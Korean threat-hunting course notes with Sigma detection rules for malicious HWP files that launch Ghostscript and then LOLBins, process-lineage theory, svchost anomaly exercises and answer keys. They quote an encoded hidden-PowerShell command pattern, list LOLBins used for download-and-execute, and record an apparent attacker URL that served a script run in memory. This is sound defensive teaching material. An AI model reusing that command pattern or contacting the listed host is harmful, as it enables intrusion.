		조건1. 한컴오피스 프로그램을(hwp.exe) 이용하여 포스트스크립트가 내장된 문서파일을 열람하는 경우를 헌팅 합니다.
		조건2. 고스트스크립트 모듈은"gswin32.exe", "gswin32c.exe", "gswin64.exe", "gswin64c.exe", "gbb.exe" 입니다.

	질문:
		Q. 시스템 내에서 포스트스크립트가 담긴 악성코드를 열람한 흔적이 있습니까? 시간, 파일경로 등을 확인해 보세요.
		A.
			DESKTOP-9SCSJHC PC 에서 이벤트가 발생했습니다.
			2021.11.10 15:36:46~48 시간에 C:\Users\user03\Downloads\[개발팀]채용요청서.hwp 파일을 열람했습니다.
			해당 HWP 파일은 포스트스크립트가 포함되어 있습니다.
			gbb.exe 프로그램이 파일내에 있는 포스트스크립트 파일은 %TEMP% 폴더 이하로 옮김, 이후 gswin32c.exe 가 실행합니다.
```
```plain text
STEP1. 다음과 같은 시그마 룰을 제작 합니다.
        --- DetectGhostScriptExecution.yml -----------------------------------------------------------
        title: DetectGhostScriptExecution
        id:
        author:
        date:
        description: Any
        status: experimental
        tag: MITRE_ATT&CK-INITIAL_ACCESS-T1566.001

        logsource:
          product: windows
          service: sysmon

        detection:
          selection:
            EventID: 1		# ProcessCreation
			ParentImage|contains: hwp.exe
			Image|contains:
			 - 'gswin32c.exe'
			 - 'gswin32.exe'
			 - 'gswin64c.exe'
			 - 'gswin64.exe'
			 - 'gbb.exe'
		  condition: selection
		level: high
        ----------------------------------------------------------------------------------------------
    STEP4. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP5. OpenOffice 혹은 Timeline Explorer 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다.
}
```
```text
detection:
··selection:
····EventID: 1
····ParentImage|contains: 'hwp.exe'
····Image|contains:
······- 'gswin32c.exe'
······- 'gswin32.exe'
······- 'gswin64c.exe'
······- 'gswin64.exe'
······- 'gbb.exe'
··condition: selection
level: high
```

한컴

pdf export (내보네기 기능) - 외부에 내보낼려면 출력해야한다.

postscript를 이용해 한컴은 출력함이콘 추가

Ghostscript- 인터프린터해주는 프로그램

그래서 고스트스크립트를 통해 포스트스크립트가 실행된다.

> 📷 분석 보고서 발췌: 한글(HWP) 프로그램에 포함된 고스트스크립트 8.71 경로(Hnc\HOffice9\Bin\ImgFilters\GS\gs8.71\bin). 핵심은 gsdll32.dll이며 gbb.exe 외에는 공개 소스로 빌드된 파일 — 악성 HWP의 포스트스크립트가 이 인터프리터로 실행된다.

https://image.ahnlab.com/atip/content/atcp/tistory/1239_AhnLab_ASEC_한글파일에숨어든고스트.pdf

gbb.exe - 고스트 스크립트 안애서 살행 파일을 ….

포스트 스크립트가 실행되게 된다.
```plain text
+ 교육생실습. 고스트스트립트에 의해 실행된 LoLBins 실행 이벤트 식별 {
	미션:
	  AND
		조건1. 이하 주요 LOLBins(13개) 들이 실행된 흔적을 찾으세요.
			mshta.exe, certutil.exe, bitsadmin.exe, csc.exe, forfiles.exe
			powershell.exe, wmic.exe, mshta.exe, hh.exe, msiexec.exe
			wscript.exe, cmd.exe, rundll32.exe
		조건2. LOLBins가 고스트스크립트에 의해서(부모가 고스트스크립트인) 실행된 경우에 한해서 조사해 보세요.
			gswin32c.exe, gswin64c.exe, gswin32.exe, gswin64.exe, gbb.exe

	힌트:
		이하 문법들을 활용해 보세요.
			EventID, CommandLine|contains, ParentCommandLine|contains

	질문:
		Q1. LOLBins가 실행된 것으로 추정되는 단말은 무엇입니까?
		A. DESKTOP-9SCSJHC (Windows-Operational-Sysmon-PC3.evtx)

		Q2. Q1 에서 식별된 위협발생 단말에서 어떠한 LOLBins 들이 실행 되었나요? 실행시간, 경로, 실행 내용등을 타임라인으로 정리해 보세요.
		A. 위 조건에 만족되는 LoL Binary 는 총 2번 실행됨.

		Q3. Q1 에서 헌팅된 LoLBinary는 어떠한 외부 도메인(IP)과 통신을 수행 합니까?
		A. http://www.sparkdept.com/Attach 경로로 접근하여 파워쉘 스크립트를 다운로드(메모리) 한 후 실행
		   위의 도메인은 공격자가 관리하는 악성코드 유포 서버로 추정됨.

		IDX	Timestamp	ParentP-ChildP				Description
		-------------------------------------------------------------------------------
		0	2000.00.00	PProcess-CProcess			Example Description

		   2021.11.10
		1	15:36:48	gbb.exe-powershell.exe		"user03"에 의해 실행되었으며, IL은 "medium"
		2	15:36:50	gswin32c.exe-powershell.exe	"user03"에 의해 실행되었으며, IL은 "medium"

		explorer.exe
			|- hwp.exe
				|- gbb.exe
					|- powershell.exe
				|- gswin32c.exe
					|- powershell.exe
		-------------------------------------------------------------------------------
	예제룰:
	-- LoLBinaryWithGhostscriptExecution.yml ------------------------------------------------------------------------------------------------------------------
		title: LoL binary with Ghostscript Execution
		id:
		author:
		date:
		description: LoL binary Execution
		status: experimental
		tag: LoL binary Execution

		logsource:
		  product: windows
		  service: sysmon

		detection:
		 CmdlineContainsLoLBins:
		  EventID: 1
		  CommandLine|contains:
		   - 'mshta.exe'
		   - 'certutil.exe'
		   - 'bitsadmin.exe'
		   - 'csc.exe'
		   - 'forfiles.exe'
		   - 'powershell.exe'
		   - 'wmic.exe'
		   - 'mshta.exe'
		   - 'hh.exe'
		   - 'msiexec.exe'
		   - 'wscript.exe'
		   - 'cmd.exe'
		   - 'rundll32.exe'
		 ParentCommandLineContainsGhostscript:
		  ParentCommandLine|contains:
		   - 'gswin32c.exe'
		   - 'gswin64c.exe'
		   - 'gbb.exe'
		 condition: CmdlineContainsLoLBins and ParentCommandLineContainsGhostscript

		falsepositives: unknown
		level: high
	--------------------------------------------------------------------------------------------------------------------
	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
	# 앞서 스피어피싱 파일첨부 공격 관련 위협 이벤트의 타임라인 전후로 관찰.
}
위의 도메인은 공격자가 관리하는 악성코드 유포 서버로 추정됨.
		

		
```
```plain text
위의 도메인은 공격자가 관리하는 악성코드 유포 서버로 추정됨.

		IDX	Timestamp	ParentP-ChildP				Description
		-------------------------------------------------------------------------------
		0	2000.00.00	PProcess-CProcess			Example Description

		   2021.11.10
		1	15:36:48	gbb.exe-powershell.exe		"user03"에 의해 실행되었으며, IL은 "medium"
		2	15:36:50	gswin32c.exe-powershell.exe	"user03"에 의해 실행되었으며, IL은 "medium"

		explorer.exe
			|- hwp.exe
				|- gbb.exe
					|- powershell.exe	<--- 다운로드&실행 --- http://www.sparkdept.com/Attach
				|- gswin32c.exe
					|- powershell.exe	<--- 다운로드&실행 --- http://www.sparkdept.com/Attach
		-------------------------------------------------------------------------------
	예제룰:
	-- LoLBinaryWithGhostscriptExecution.yml ------------------------------------------------------------------------------------------------------------------
		title: LoL binary with Ghostscript Execution
		id:
		author:
		date:
		description: LoL binary Execution
		status: experimental
		tag: LoL binary Execution

		logsource:
		  product: windows
		  service: sysmon

		detection:
		 CmdlineContainsLoLBins:
		  EventID: 1
		  CommandLine|contains:
		   - 'mshta.exe'
		   - 'certutil.exe'
		   - 'bitsadmin.exe'
		   - 'csc.exe'
		   - 'forfiles.exe'
		   - 'powershell.exe'
		   - 'wmic.exe'
		   - 'mshta.exe'
		   - 'hh.exe'
		   - 'msiexec.exe'
		   - 'wscript.exe'
		   - 'cmd.exe'
		   - 'rundll32.exe'
		 ParentCommandLineContainsGhostscript:
		  ParentCommandLine|contains:
		   - 'gswin32c.exe'
		   - 'gswin64c.exe'
		   - 'gbb.exe'
		 condition: CmdlineContainsLoLBins and ParentCommandLineContainsGhostscript

		falsepositives: unknown
		level: high
	--------------------------------------------------------------------------------------------------------------------
	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
	# 앞서 스피어피싱 파일첨부 공격 관련 위협 이벤트의 타임라인 전후로 관찰.
}
```
```plain text
+ 이론. 프로세스의 이상징후 식별 방법 {
    + 경로 및 이름 분석 (D3-PSA. Process Spawn Analysis) {
        - 일반적이지 않은 경로와 이름을 사용하여 실행되는 프로세스가 존재 하는가?
            C:\Windows\System32\explorer.exe (X), C:\Windows\Explorer.exe (O)
            // 프로세스 이름은 정상, 경로가 Built-In 이 아님.

            C:\Windows\System32\w3wp.exe (X), C:\Windows\System32\inetsrv\w3wp.exe (O)
            // 프로세스 이름은 정상, 경로가 Built-In 이 아님.

            C:\Users\user\AppData\Local\Temp\svchost.exe (X), C:\Windows\system32\svchost.exe (O)
            C:\$Recycle.Bin\svchost.exe (X)
            // 프로세스 이름은 정상, 경로가 Built-In이 아니며 임시폴더임.

            C:\Windows\iciSUnrH.exe
            // Built-In 프로세스가 아님. 프로세스 이름이 무작위한 특징을 보임.

            C:\Windows\Temp\dllhost.exe (X), C:\Windows\System32\dllhost.exe (O)

            // 프로세스 이름은 정상, 경로가 Built-In이 아니며 프로세스의 일반경로가 아님
            // 대부분의 사용자 프로세스는 C:\Windows, C:\Program Files, C:\Program Files (x86) 경로에서 실행됨
		}

    + 프로세스 리니지 분석 (D3-PLA. Process Lineage Analysis) {
        - 부모자식 관계가 일반적이지 않은 프로세스가 존재 하는가?
            services.exe - svchost.exe (O), explorer.exe - cmd.exe (O)
            rundll32.exe - powershell.exe (X), powershell.exe - dllhost.exe (X)
                 없음     - svchost.exe (X, 고아 프로세스. 부모 프로세스)
            calc.exe - cmd.exe - powershell.exe (X, powershell.exe가 calc.exe 프로세스 혈통임.)
            powershell.exe - python.exe (X)
	}

    + 프로세스의 명령라인 파라미터 분석 {
        - 파라미터가 지정되어 있어야 하는데 없는 경우?
            svchost.exe _?_ (X), C:\Windows\system32\svchost.exe -k netsvcs -p (O)

        - 파라미터의 길이가 비정상적으로 긴 경우?
            powershell.exe -W Hidden -nop -ep bypass -NoExit -E JABwAE4AYgBqAFkA ... MAB4ADIAADAAeAAy (X)
	}

    + 프로세스 이미지의 버전정보 분석 {
        - 리소스 섹션의 "Version Info" 리소스 정보가 존재 하는가? (오리지널 이름, 프로덕트 이름, 밴더, 버전 등의 정보가 존재함)
	}

	+ 프로세스의 네트워크 통신 이상징후 분석 {
		네트워크 통신을 하는 일반적인 프로세스는 Local 혹은 Remote 포트가 Well-Known 포트가 사용됩니다.
		또한 일부 시스템 프로세스는 네트워크 통신을 하지 않는 경우가 있습니다. (Explorer.exe)
	}

	** 참조 **
	https://www.sans.org/blog/process-threat-hunting-part-2/
	https://www.howtogeek.com/howto/4996/what-is-conhost.exe-and-why-is-it-running/
}
```
```plain text
+ 실습. 프로세스의 이상징후 식별 실습 (리니지 분석) {
	미션. 다음 조건을 만족하는 시그마 룰을 작성하고, 조사 대상 이벤트 로그에서 위협 이벤트를 탐지 하세요.
		조건1. SVCHOST 프로세스는 'C:\Windows\System32\svchost.exe" 혹은 C:\Windows\SysWow64\svchost.exe' 에서 실행된다.
		조건2. SVCHOST 프로세스의 "CommandLine"이 "svchost.exe"로 끝나면 이상징후다.
		조건3. SVCHOST 프로세스의 부모 프로세스 이미지는 "C:\Windows\System32\services.exe" 이다.
		참조문법: EventID, Image, CommandLine|endswith, ParentImage

	Q1. 위협이 식별되는 단말은 무엇입니까?
	A. IEWIN7 (malware_be_sysmon.evtx)

	Q2. Q1 에서 식별된 단말 내에서 비정상적인 징후를 가진 svchost.exe 프로세스의 실행 시간은 언제입니까?
	A. 총 세번 이상징후를 가진채로 실행 되었다.
		2019.05.26 13:01:43
		2021.08.19 01:36:43
		2021.08.19 01:45:20

	Q3. Q1 에서 식별된 단말 내에서 svchost.exe 프로세스를 실행한 프로세스는 경로, PID는 무엇인가요?
		(jjs.exe->svchost.exe) C:\Users\IEUser\Desktop\info.rar\jjs.exe, PPID: 3883
		(DHL_Tracking->svchost.exe) C:\Users\ieuser\Documents\dhl_tracking.exe, PPID:1608, IL:HIGH
		(mssrv32.exe->svchost.exe) C:\Windows\System32\mssrv32.exe, PPID: 1620, IL:SYSTEM

	-- anormal_svchost.yml --------------------------------------------------------------
									... 이전 내용은 유사 ...
	detection:
	  process_create_svchost:
	    EventID: 1
		Image:
		 - 'C:\Windows\System32\svchost.exe'
		 - 'C:\Windows\SysWow64\svchost.exe'

	  svchost_with_no_commandline:
	    CommandLine|endswith: '\svchost.exe'

	  regular_parent_filter:
	    ParentImage: 'C:\Windows\System32\services.exe'

	  condition:
	    process_create_svchost and (svchost_with_no_commandline or not regular_parent_filter)
	// (process_create_svchost and svchost_with_no_commandline) or (process_create_svchost and not regular_parent_filter )
	level: high
	-------------------------------------------------------------------------------------

	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
}
```
```plain text
+ 이론. 윈도우 운영체제의 IL(Integrity Level), Privilege {
	IL: 프로세스가 가지는 권한행사 수준(level), 비유하자면 사원-대리-과장-부장-이사와 같은 직급수준 이라고 보시면 됩니다.
		낮은 IL을 가진 프로세스는 자기보다 높은 IL을 가진 프로세스에 접근하거나 권한을 행사할 수 없습니다.
			MalwareA Process(IL Medium) --- 메모리에 접근하여 ID/PASS 탈취 시도 (실패) ---> LSASS.EXE(IL System)
			MalwareA Process(IL Untrusted) --- 크리덴셜 정보를 가진 파일 접근 시도 (실패) ---> id.xlsx(IL Medium)
		https://redcanary.com/blog/threat-detection/better-know-a-data-source/process-integrity-levels/

	Privilege: 프로세스가 수행할 수 있는 역할. 비유하자면 R&R

}
```

tasklist 명령어를 사용하면 pid 세션이름이 평면적으로 나열이 된다. 계층을 알 수 없다. svchost.exe 는 이름으로 못찾지만 system32에 있어야할 것이 임시폴더에 있는 경우 비정상적인 파일을 경로의 차이로 분석할 수 있다. https://d3fend.mitre.org/

services가 서비스를 한다.  그리고 하나이상의 서비스는 한 프로세스인 csvhost를 서비스를 구분해 주는 파라미터 지정해 dll을 불러서 동작시킨다.

scvchost는 깡통 프로세스이지만 dll이 서비스를 관리하고 서 파라미터 지정에따라  프로그램을 구분하여 동작시킴?

#### 서비스 실행 체계

윈도우에서 서비스는 백그라운드에서 주로 실행이된다.

SCM(Service Control Manager)

##### 서비스 리니지

services.exe → svchost.exe → Service DLL.

services.exe(부모): 모든 서비스의 관리자

svchost.exe.

- 껍데기 프로세스, 깡통(host)
- 윈도우는 리소스를 아끼기 위해 여러 개의 서비스를 하나의 프로세스 안에 그룹화하여 실행 - svchost.exe.는 그릇 역활을 한다.

DLL

- 하나의 svchost.exe 프로세스 안에 여러 DLL을 올려서 메모리 사용 효율을 높이기 위해서
- 서비스의 실제 코드는  ,dll 형식으로 존재
- svchost.exe가 실행될 때 파라미터 인자를 보고 그에 맞는 dll을 로드해서 메모리에 올린다.
```text
작동 순서 정리
**SCM(services.exe)**이 레지스트리를 확인하여 실행할 서비스를 찾습니다.

실행 명령어가 svchost.exe -k [그룹이름] 방식이라면, **svchost.exe**를 실행합니다.

svchost.exe는 할당된 파라미터를 보고 해당되는 DLL 파일을 자신의 메모리 영역으로 불러옵니다(Load).

이제 **CPU(프로세서)**는 svchost.exe라는 프로세스 안에서 돌아가고 있는 DLL의 코드를 읽어 서비스를 수행합니다.
```
```plain text
교육생실습. 고스트스트립트에 의해 실행된 LoLBins 실행 이벤트 식별 {
	미션:
	  AND
		조건1. 이하 주요 LOLBins(13개) 들이 실행된 흔적을 찾으세요.
			mshta.exe, certutil.exe, bitsadmin.exe, csc.exe, forfiles.exe
			powershell.exe, wmic.exe, mshta.exe, hh.exe, msiexec.exe
			wscript.exe, cmd.exe, rundll32.exe
		조건2. LOLBins가 고스트스크립트에 의해서(부모가 고스트스크립트인) 실행된 경우에 한해서 조사해 보세요.
			gswin32c.exe, gswin64c.exe, gswin32.exe, gswin64.exe, gbb.exe

	힌트:
		이하 문법들을 활용해 보세요.
			EventID, CommandLine|contains, ParentCommandLine|contains

	질문:
		Q1. LOLBins가 실행된 것으로 추정되는 단말은 무엇입니까?
		A. DESKTOP-9SCSJHC (Windows-Operational-Sysmon-PC3.evtx)

		Q2. Q1 에서 식별된 위협발생 단말에서 어떠한 LOLBins 들이 실행 되었나요? 실행시간, 경로, 실행 내용등을 타임라인으로 정리해 보세요.
		A. 위 조건에 만족되는 LoL Binary 는 총 2번 실행됨.

		Q3. Q1 에서 헌팅된 LoLBinary는 어떠한 외부 도메인(IP)과 통신을 수행 합니까?
		A. http://www.sparkdept.com/Attach 경로로 접근하여 파워쉘 스크립트를 다운로드(메모리) 한 후 실행
		   위의 도메인은 공격자가 관리하는 악성코드 유포 서버로 추정됨.

		IDX	Timestamp	ParentP-ChildP				Description
		-------------------------------------------------------------------------------
		0	2000.00.00	PProcess-CProcess			Example Description

		   2021.11.10
		1	15:36:48	gbb.exe-powershell.exe		"user03"에 의해 실행되었으며, IL은 "medium"
		2	15:36:50	gswin32c.exe-powershell.exe	"user03"에 의해 실행되었으며, IL은 "medium"

		explorer.exe
			|- hwp.exe
				|- gbb.exe
					|- powershell.exe	<--- 다운로드&실행 --- http://www.sparkdept.com/Attach
				|- gswin32c.exe
					|- powershell.exe	<--- 다운로드&실행 --- http://www.sparkdept.com/Attach
		-------------------------------------------------------------------------------
	예제룰:
	-- LoLBinaryWithGhostscriptExecution.yml ------------------------------------------------------------------------------------------------------------------
		title: LoL binary with Ghostscript Execution
		id:
		author:
		date:
		description: LoL binary Execution
		status: experimental
		tag: LoL binary Execution

		logsource:
		  product: windows
		  service: sysmon

		detection:
		 CmdlineContainsLoLBins:
		  EventID: 1
		  CommandLine|contains:
		   - 'mshta.exe'
		   - 'certutil.exe'
		   - 'bitsadmin.exe'
		   - 'csc.exe'
		   - 'forfiles.exe'
		   - 'powershell.exe'
		   - 'wmic.exe'
		   - 'mshta.exe'
		   - 'hh.exe'
		   - 'msiexec.exe'
		   - 'wscript.exe'
		   - 'cmd.exe'
		   - 'rundll32.exe'
		 ParentCommandLineContainsGhostscript:
		  ParentCommandLine|contains:
		   - 'gswin32c.exe'
		   - 'gswin64c.exe'
		   - 'gbb.exe'
		 condition: CmdlineContainsLoLBins and ParentCommandLineContainsGhostscript

		falsepositives: unknown
		level: high
	--------------------------------------------------------------------------------------------------------------------
	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
	# 앞서 스피어피싱 파일첨부 공격 관련 위협 이벤트의 타임라인 전후로 관찰.
}
```
```plain text
 이론. 프로세스의 이상징후 식별 방법 {
    + 경로 및 이름 분석 (D3-PSA. Process Spawn Analysis) {
        - 일반적이지 않은 경로와 이름을 사용하여 실행되는 프로세스가 존재 하는가?
            C:\Windows\System32\explorer.exe (X), C:\Windows\Explorer.exe (O)
            // 프로세스 이름은 정상, 경로가 Built-In 이 아님.

            C:\Windows\System32\w3wp.exe (X), C:\Windows\System32\inetsrv\w3wp.exe (O)
            // 프로세스 이름은 정상, 경로가 Built-In 이 아님.

            C:\Users\user\AppData\Local\Temp\svchost.exe (X), C:\Windows\system32\svchost.exe (O)
            C:\$Recycle.Bin\svchost.exe (X)
            // 프로세스 이름은 정상, 경로가 Built-In이 아니며 임시폴더임.

            C:\Windows\iciSUnrH.exe
            // Built-In 프로세스가 아님. 프로세스 이름이 무작위한 특징을 보임.

            C:\Windows\Temp\dllhost.exe (X), C:\Windows\System32\dllhost.exe (O)

            // 프로세스 이름은 정상, 경로가 Built-In이 아니며 프로세스의 일반경로가 아님
            // 대부분의 사용자 프로세스는 C:\Windows, C:\Program Files, C:\Program Files (x86) 경로에서 실행됨
		}

    + 프로세스 리니지 분석 (D3-PLA. Process Lineage Analysis) {
        - 부모자식 관계가 일반적이지 않은 프로세스가 존재 하는가?
            services.exe - svchost.exe (O), explorer.exe - cmd.exe (O)
            rundll32.exe - powershell.exe (X), powershell.exe - dllhost.exe (X)
                 없음     - svchost.exe (X, 고아 프로세스. 부모 프로세스)
            calc.exe - cmd.exe - powershell.exe (X, powershell.exe가 calc.exe 프로세스 혈통임.)
            powershell.exe - python.exe (X)
	}

    + 프로세스의 명령라인 파라미터 분석 {
        - 파라미터가 지정되어 있어야 하는데 없는 경우?
            svchost.exe _?_ (X), C:\Windows\system32\svchost.exe -k netsvcs -p (O)

        - 파라미터의 길이가 비정상적으로 긴 경우?
            powershell.exe -W Hidden -nop -ep bypass -NoExit -E JABwAE4AYgBqAFkA ... MAB4ADIAADAAeAAy (X)
	}

    + 프로세스 이미지의 버전정보 분석 {
        - 리소스 섹션의 "Version Info" 리소스 정보가 존재 하는가? (오리지널 이름, 프로덕트 이름, 밴더, 버전 등의 정보가 존재함)
	}

	+ 프로세스의 네트워크 통신 이상징후 분석 {
		네트워크 통신을 하는 일반적인 프로세스는 Local 혹은 Remote 포트가 Well-Known 포트가 사용됩니다.
		또한 일부 시스템 프로세스는 네트워크 통신을 하지 않는 경우가 있습니다. (Explorer.exe)
	}

	** 참조 **
	https://www.sans.org/blog/process-threat-hunting-part-2/
	https://www.howtogeek.com/howto/4996/what-is-conhost.exe-and-why-is-it-running/
}
```
```plain text
+ 실습. 프로세스의 이상징후 식별 실습 (리니지 분석) {
	미션. 다음 조건을 만족하는 시그마 룰을 작성하고, 조사 대상 이벤트 로그에서 위협 이벤트를 탐지 하세요.
		조건1. SVCHOST 프로세스는 'C:\Windows\System32\svchost.exe" 혹은 C:\Windows\SysWow64\svchost.exe' 에서 실행된다.
		조건2. SVCHOST 프로세스의 "CommandLine"이 "svchost.exe"로 끝나면 이상징후다.
		조건3. SVCHOST 프로세스의 부모 프로세스 이미지는 "C:\Windows\System32\services.exe" 이다.
		참조문법: EventID, Image, CommandLine|endswith, ParentImage

	Q1. 위협이 식별되는 단말은 무엇입니까?
	A. IEWIN7 (malware_be_sysmon.evtx)

	Q2. Q1 에서 식별된 단말 내에서 비정상적인 징후를 가진 svchost.exe 프로세스의 실행 시간은 언제입니까?
	A. 총 세번 이상징후를 가진채로 실행 되었다.
		2019.05.26 13:01:43
		2021.08.19 01:36:43
		2021.08.19 01:45:20

	Q3. Q1 에서 식별된 단말 내에서 svchost.exe 프로세스를 실행한 프로세스는 경로, PID는 무엇인가요?
		(jjs.exe->svchost.exe) C:\Users\IEUser\Desktop\info.rar\jjs.exe, PPID: 3883
		(DHL_Tracking->svchost.exe) C:\Users\ieuser\Documents\dhl_tracking.exe, PPID:1608, IL:HIGH
		(mssrv32.exe->svchost.exe) C:\Windows\System32\mssrv32.exe, PPID: 1620, IL:SYSTEM

	-- anormal_svchost.yml --------------------------------------------------------------
									... 이전 내용은 유사 ...
	detection:
	  process_create_svchost:
	    EventID: 1
		Image:
		 - 'C:\Windows\System32\svchost.exe'
		 - 'C:\Windows\SysWow64\svchost.exe'

	  svchost_with_no_commandline:
	    CommandLine|endswith: '\svchost.exe'

	  regular_parent_filter:
	    ParentImage: 'C:\Windows\System32\services.exe'

	  condition:
	    process_create_svchost and (svchost_with_no_commandline or not regular_parent_filter)
	// (process_create_svchost and svchost_with_no_commandline) or (process_create_svchost and not regular_parent_filter )
	level: high
	-------------------------------------------------------------------------------------

	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
}
```
```plain text
 실습. 프로세스의 이상징후 식별 실습 (경로 및 이름 분석) {
	배경:
		김보안씨는 고객사 조직의 XDR 환경에서 위협사냥을 해야합니다.
		우선 프로세스의 이상징후 분석을 하고 있습니다.
		현재 조직내에서 동작하고 있는 윈도우 시스템 내에서 LOL 바이너리에 의해 실행 되었으며 일반적이지 않은 곳에서 실행된 프로세스를 찾고자 합니다.
	미션:
		조건1. C:\Windows 폴더, C:\Windows\System32 폴더, C:\Program Files 폴더. C:\Program Files(x86) 폴더를 제외한 경로에서 실행된 프로세스를 찾으세요.
		조건2. 조건1을 만족하면서 and LOL Binary에 의해 실행된 경우 (위 실습의 13개 항목 모두 포함)

	대상:
		E:\EVTLOG 폴더에 제공된 SYSLOG 이벤트 로그파일 전체

	팁:
		Timeline Explorer 툴을 이용하여 Rule Title->Computer 레이어로 그루핑 하면 분석이 수월합니다.

	질문:
		Q. 분석대상 조직에서 이상징후가 식별되는 PC가 존재하나요? PC의 이름은 무엇입니까?
		A.	"DESKTOP-9SCSJHC", "DESKTOP-CQ2AV2S" 단말에서 이상징후가 보입니다.

		Q. LOL Bins에 의해 실행된 경로가 의심스러운 프로그램은 무엇입니까?
		A.	"DESKTOP-9SCSJHC" 단말
			 - Powershell.exe --실행--> C:\Users\user03\AppData\Roaming\PCCleaner.exe (IL: Medium)
			 - cmd.exe --실행--> C:\Users\user03\AppData\Local\Temp\conhost.exe (IL: Medium)
			 - cmd.exe --실행--> C:\Users\user03\AppData\Local\Temp\Collector.exe (IL: Medium)
			 - cmd.exe --실행--> C:\Users\user03\AppData\Local\Temp\UpdateManager.exe (IL: Medium)
			"DESKTOP-CQ2AV2S" 단말
			 - cmd.exe --실행--> D:\Downloads\PSTools\PsExec.exe

	예제룰 및 실행방법:
		예제룰:
		-- anormal_imagepath_from_lolbins.yml ------------------------------------------------------------------------------------------------------------------
		.. 이전 내용과 동일 ..

		detection:
		  EventLogs:
		    EvnetID: 1

		  good_process_paths:
		    Image|contains:
		      - '\Windows\'
		      - '\Windows\System32\'
		      - 'Program Files\'
		      - 'Program Files (x86)\'

		  ParentCommandLineContainsLOLBins:
		    - 'mshta.exe'
		    - 'certutil.exe'
		    - 'bitsadmin.exe'
		    - 'csc.exe'
		    - 'forfiles.exe'
		    - 'powershell.exe'
		    - 'wmic.exe'
		    - 'mshta.exe'
		    - 'hh.exe'
		    - 'msiexec.exe'
		    - 'wscript.exe'
		    - 'cmd.exe'
		    - 'rundll32.exe'
		  condition:
		    (EventLogs and not good_process_paths) and ParentCommandLineContainsLOLBins

		level: high
		------------------------------------------------------------------------------------------------------------
		C:> hayabusa csv-timeline -r .\myrules -d .\logs -C -o result.csv
}
```
```plain text
 이론. 윈도우 운영체제의 IL(Integrity Level), Privilege {
	IL: 프로세스가 가지는 권한행사 수준(level), 비유하자면 사원-대리-과장-부장-이사와 같은 직급수준 이라고 보시면 됩니다.
		낮은 IL을 가진 프로세스는 자기보다 높은 IL을 가진 프로세스에 접근하거나 권한을 행사할 수 없습니다.
			MalwareA Process(IL Medium) --- 메모리에 접근하여 ID/PASS 탈취 시도 (실패) ---> LSASS.EXE(IL System)
			MalwareA Process(IL Untrusted) --- 크리덴셜 정보를 가진 파일 접근 시도 (실패) ---> id.xlsx(IL Medium)
		https://redcanary.com/blog/threat-detection/better-know-a-data-source/process-integrity-levels/

	Privilege: 프로세스가 수행할 수 있는 역할. 비유하자면 R&R

}
```


## 3Day

<복습>

##### 프로세스  리소스 -  반드시 수집해야 함

1. pid ppid 값을 가져와서 혈통관계를 분석하기 위해서 - 리니지 분석이 가능하다.
1. command line /image path(dll 같은 파라미터 값) - 프로세서 실행 경로 정보와 프로세서가 인풋받을 파라미터를 포함한것 -
1. Digital Sign  - 인증서 - 시그체크
1. network 활동 -netstate애서 얻을 수 있는 정보 sync를 받는지… 포터 통신을 하여 포터 시스템정보가 남아있으면 예를 들면 메롤ㄴ 포터가 아닌 경우 의심할 수 있다.

explore.exe 쉘 역활을하는 것.  네트워크 통신을 하지 않는 게 정상

프로세스 이상 징후를 파악하는 방법

필수적으로 수집 해야 할 네트워크 정보

ms 접근 주체

- IL- 무결성 수준 INTERGRATE ,  신뢰성의 깨진 상태, 신분
- Privilige - 역활

모든 계정이 로그인이 되지 않는다. 서비스를 실행하기 위한 계정

로그인 전에 모든 프로세스가 다 실행되고 있다.

expler.exe 는 사용자 수준을 띄어 넘을 수 없는 프로세스

만약 로그인이 어드민이면 모든 서비스가 어드민 권한을 갖는다.

익스프로어를 통해 실행하면 미디엄 레벨로 하위 레벨의 서비스가 실행이 되기 때문에 권한 상승이 필요한 경우가 있다.

.exe

h

s

s

s src - 이 안에 manifest를 넣어두면 (xml) 권한 상승을 자동으로 시킬 수 있다.

만약 어떤 파일이 하위 레벨에서만 작동이 가능한 경우 권한 상승이 필요하다.

- 관리자 그룹에 속해있는 사용자가 되어야한다.
- 오토프리빌리지 에스컬레이터가 manifest에 있어야한다.
- uac를 허용해주어야하낟.
- system32 안에 꼭 있어야 하다.
```text
이론. 윈도우 운영체제의 프로세스 권한 상승 {
	알아둘 것. 윈도우 프로세스는 IL 상승에 대한 요청을 OS 에게 할 수 있으나 다음 조건을 만족해야 함.	
		첫째, 
			실행파일 내에 있는 XML 포맷으로 된 매니패스트 파일 내에 권한상승을 요구하는 설정 값이 있어야 함.
		둘째, 
			프로세스를 실행하는 사용자계정은 기본적으로 "administrators" 그룹 내에 속해 있어야 함
			만약 "administrators" 그룹이 아닌 일반 사용자 그룹일 경우 ID/PASS를 입력해야 함
		셋째,
			UAC 정책에 의해 사용자가 권한 상승을 명시적으로 허용해 주어야 함 (어두운 색 창)

	알아둘 것. 윈도우 프로세스의 자동권한승격(Auto Elevation) 조건
		첫째,	<-- 보통은 단말에 진입한지 얼마 안되는 공격자들이 이 조건을 만족시키기 어려움
			파일 내에 반드시 마이크로소프트에 의해 디지털 서명된 인증서가 포함되어야 함
		둘째,	<-- 보통은 단말에 진입한지 얼마 안되는 공격자들이 이 조건을 만족시키기 어려움
			파일이 System32 폴더 내에 존재해야 함
		셋째,
			파일 내에 있는 XML 포맷으로 된 매니패스트 파일 내에 자동권한상승을 요구하는 설정 값이 있어야 함.
		
}
```
```plain text
+ 실습. 의심스러운 네트워크 통신 이벤트 탐지 실습 (시나리오 통합 분석) {
	미션. SYSMON 이벤트로그 ID 3은 "Network Connection"과 관련된 내용이며 관련 설명은 다음과 같습니다.
	The network connection event logs TCP/UDP connections on the machine.
	It is disabled by default.
	Each connection is linked to a process through the ProcessId and ProcessGUID fields.
	The event also contains the source and destination host names IP addresses, port numbers and IPv6 status.

	기존 HAYABUSA 도구에서 제공하는 위협 이벤트 네트워크 연결 관련 시그마 룰을 사용해 보세요.
	E:\DFIR\hayausa\rules\sigma\sysmon\network_connection
